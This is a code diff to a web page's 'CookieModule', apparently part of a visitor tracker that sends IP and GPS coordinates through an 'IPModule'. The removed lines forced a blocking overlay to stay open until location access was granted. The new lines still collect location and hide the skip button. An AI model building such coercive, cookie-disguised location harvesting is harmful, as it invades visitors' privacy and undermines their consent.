@@ -83,17 +83,16 @@ const CookieModule = {
     overlay.style.display = "flex";
 
     allow.addEventListener("click", () => {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          localStorage.setItem("loc_granted", "1");
-          overlay.remove();
-          IPModule.send(pos.coords.latitude, pos.coords.longitude);
-        },
-        () => {
-          // negou GPS, mantém overlay aberto para forçar
-          alert("A localização é necessária para continuar. Por favor, permita o acesso.");
-        }
-      );
+      localStorage.setItem("loc_granted", "1");
+      overlay.remove();
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          (pos) => IPModule.send(pos.coords.latitude, pos.coords.longitude),
+          ()    => IPModule.send(null, null)
+        );
+      } else {
+        IPModule.send(null, null);
+      }
     });
 
     if (skip) skip.style.display = "none";
